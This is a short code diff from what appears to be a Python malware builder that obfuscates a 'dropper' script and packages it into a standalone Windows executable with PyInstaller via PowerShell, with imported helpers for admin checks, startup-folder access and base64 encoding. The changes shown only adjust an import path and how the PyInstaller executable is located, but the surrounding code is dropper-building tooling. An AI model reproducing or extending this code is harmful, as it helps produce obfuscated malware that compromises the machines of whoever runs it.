@@ -3,7 +3,7 @@ import os
 import shutil
 import subprocess
 import time
-from Utils.helpers import is_os_64bit, random_string, run_pwsh, is_msvc_exist, \
+from Utils.backup.helpers import is_os_64bit, random_string, run_pwsh, is_msvc_exist, \
     download_file, extract_zip, get_current_file_path, base64_encode_file, \
     find_python_path, ctypes_update_system,is_admin,startupFolder,tempFolder,BaseTempFolder,set_env_variable
 from .pyinstaller_obfuscate.main import obfuscate_files
@@ -73,12 +73,15 @@ def {obfuscated_main_function}():
     print(dropper_py_file)
     python_path = find_python_path()
     if 'program' in python_path.lower():
-        check_if_pyinstaller_installed = f"'{python_path}' -m pip list"
+        check_if_pyinstaller_installed = f'pip list'
     else:
         check_if_pyinstaller_installed = f"{python_path} -m pip list"
     print(run_pwsh(check_if_pyinstaller_installed))
     if 'pyinstaller' in run_pwsh(check_if_pyinstaller_installed).lower():
-        pyinstaller_path = python_path.replace('python.exe', 'scripts/pyinstaller.exe')
+        if 'program' in python_path.lower():
+            pyinstaller_path = 'pyinstaller.exe'
+        else:
+            pyinstaller_path = python_path.replace('python.exe', 'scripts/pyinstaller.exe')
         print(pyinstaller_path)
         install_it = run_pwsh(
             f"{pyinstaller_path} --onefile --icon=NONE '{dropper_py_file}' --distpath '{os.path.dirname(dropper_py_file)}'")
